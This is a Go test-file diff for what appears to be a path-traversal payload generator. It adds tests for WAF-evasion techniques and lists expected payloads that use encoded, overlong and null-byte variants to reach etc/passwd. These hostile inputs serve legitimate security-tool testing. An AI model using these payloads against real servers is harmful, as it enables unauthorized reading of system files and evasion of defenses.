@@ -21,6 +21,11 @@ func TestGenerate_AllTechniquesPresent(t *testing.T) {
 		"null-byte-percent",
 		"null-byte-raw",
 		"absolute-path",
+		"waf-double-slash",
+		"waf-overlong-slash",
+		"waf-encoded-backslash",
+		"waf-dotslash-prefix",
+		"waf-null-interstitial",
 		"php-filter",
 		"file-uri",
 	}
@@ -121,6 +126,11 @@ func TestGenerate_TraversalCategory(t *testing.T) {
 		"null-byte-percent":        true,
 		"null-byte-raw":            true,
 		"absolute-path":            true,
+		"waf-double-slash":         true,
+		"waf-overlong-slash":       true,
+		"waf-encoded-backslash":    true,
+		"waf-dotslash-prefix":      true,
+		"waf-null-interstitial":    true,
 	}
 
 	for _, p := range payloads {
@@ -192,5 +202,178 @@ func TestGenerate_NullByteSuffix(t *testing.T) {
 				t.Errorf("null-byte-raw: expected \\x00 suffix in %q", p.Value)
 			}
 		}
+	}
+}
+
+func TestGenerate_WAFEvasionValues(t *testing.T) {
+	payloads := Generate("etc/passwd", 1)
+
+	want := map[string]string{
+		"waf-double-slash":      "..%252fetc/passwd",
+		"waf-overlong-slash":    "..%c0%afetc/passwd",
+		"waf-encoded-backslash": "..%5cetc/passwd",
+		"waf-dotslash-prefix":   "./../etc/passwd",
+		"waf-null-interstitial": "..%00/etc/passwd",
+	}
+
+	got := map[string]string{}
+	for _, p := range payloads {
+		if _, ok := want[p.Technique]; ok {
+			got[p.Technique] = p.Value
+		}
+	}
+
+	for tech, exp := range want {
+		if got[tech] != exp {
+			t.Errorf("%s depth=1: got %q, want %q", tech, got[tech], exp)
+		}
+	}
+}
+
+func TestGenerate_WAFEvasionDepth(t *testing.T) {
+	depth := 3
+	payloads := Generate("etc/passwd", depth)
+
+	counts := map[string]int{}
+	wafTechs := []string{
+		"waf-double-slash", "waf-overlong-slash", "waf-encoded-backslash",
+		"waf-dotslash-prefix", "waf-null-interstitial",
+	}
+	wafSet := map[string]bool{}
+	for _, t := range wafTechs {
+		wafSet[t] = true
+	}
+	for _, p := range payloads {
+		if wafSet[p.Technique] {
+			counts[p.Technique]++
+		}
+	}
+	for _, tech := range wafTechs {
+		if counts[tech] != depth {
+			t.Errorf("%s: expected %d payloads at depth=%d, got %d", tech, depth, depth, counts[tech])
+		}
+	}
+}
+
+func TestTechniques_MatchesGenerateOutput(t *testing.T) {
+	payloads := Generate("etc/passwd", 4)
+
+	emitted := map[string]bool{}
+	for _, p := range payloads {
+		emitted[p.Technique] = true
+	}
+
+	declared := Techniques()
+	declaredSet := map[string]bool{}
+	for _, t := range declared {
+		declaredSet[t] = true
+	}
+
+	// Every emitted technique must be declared.
+	for tech := range emitted {
+		if !declaredSet[tech] {
+			t.Errorf("Generate emits technique %q not declared in Techniques()", tech)
+		}
+	}
+	// Every declared technique must actually be emitted.
+	for _, tech := range declared {
+		if !emitted[tech] {
+			t.Errorf("Techniques() declares %q but Generate never emits it", tech)
+		}
+	}
+}
+
+func TestTechniques_OrderMatchesFirstAppearance(t *testing.T) {
+	payloads := Generate("etc/passwd", 4)
+
+	// Build first-appearance order from Generate output.
+	var order []string
+	seen := map[string]bool{}
+	for _, p := range payloads {
+		if !seen[p.Technique] {
+			seen[p.Technique] = true
+			order = append(order, p.Technique)
+		}
+	}
+
+	declared := Techniques()
+	if len(order) != len(declared) {
+		t.Fatalf("technique count mismatch: Generate first-appearance=%d, Techniques()=%d", len(order), len(declared))
+	}
+	for i := range order {
+		if order[i] != declared[i] {
+			t.Errorf("order mismatch at %d: Generate=%q, Techniques()=%q", i, order[i], declared[i])
+		}
+	}
+}
+
+func TestGenerateFiltered_Subset(t *testing.T) {
+	include := []string{"dotdot-slash", "php-filter"}
+	payloads := GenerateFiltered("etc/passwd", 4, include)
+
+	if len(payloads) == 0 {
+		t.Fatal("expected payloads, got none")
+	}
+	allowed := map[string]bool{"dotdot-slash": true, "php-filter": true}
+	sawSlash, sawPHP := false, false
+	for _, p := range payloads {
+		if !allowed[p.Technique] {
+			t.Errorf("unexpected technique %q in filtered output", p.Technique)
+		}
+		if p.Technique == "dotdot-slash" {
+			sawSlash = true
+		}
+		if p.Technique == "php-filter" {
+			sawPHP = true
+		}
+	}
+	if !sawSlash || !sawPHP {
+		t.Errorf("filtered output missing requested techniques: slash=%v php=%v", sawSlash, sawPHP)
+	}
+}
+
+func TestGenerateFiltered_EmptyIncludeMeansAll(t *testing.T) {
+	all := Generate("etc/passwd", 4)
+	filteredNil := GenerateFiltered("etc/passwd", 4, nil)
+	filteredEmpty := GenerateFiltered("etc/passwd", 4, []string{})
+
+	if len(filteredNil) != len(all) {
+		t.Errorf("nil include: got %d payloads, want %d (all)", len(filteredNil), len(all))
+	}
+	if len(filteredEmpty) != len(all) {
+		t.Errorf("empty include: got %d payloads, want %d (all)", len(filteredEmpty), len(all))
+	}
+}
+
+func TestGenerateFiltered_PreservesOrdering(t *testing.T) {
+	// Plain dotdot-slash should still precede url-encoded when both selected.
+	payloads := GenerateFiltered("etc/passwd", 4, []string{"url-encoded", "dotdot-slash"})
+
+	plainIdx, encodedIdx := -1, -1
+	for i, p := range payloads {
+		if p.Technique == "dotdot-slash" && plainIdx == -1 {
+			plainIdx = i
+		}
+		if p.Technique == "url-encoded" && encodedIdx == -1 {
+			encodedIdx = i
+		}
+	}
+	if plainIdx == -1 || encodedIdx == -1 {
+		t.Fatalf("missing techniques: plain=%d encoded=%d", plainIdx, encodedIdx)
+	}
+	if plainIdx >= encodedIdx {
+		t.Errorf("ordering not preserved: plain idx %d should precede encoded idx %d", plainIdx, encodedIdx)
+	}
+}
+
+func TestGenerateFiltered_UnknownIgnored(t *testing.T) {
+	payloads := GenerateFiltered("etc/passwd", 4, []string{"dotdot-slash", "does-not-exist"})
+	for _, p := range payloads {
+		if p.Technique != "dotdot-slash" {
+			t.Errorf("unexpected technique %q (unknown name should be ignored)", p.Technique)
+		}
+	}
+	if len(payloads) == 0 {
+		t.Error("expected dotdot-slash payloads, got none")
 	}
 }
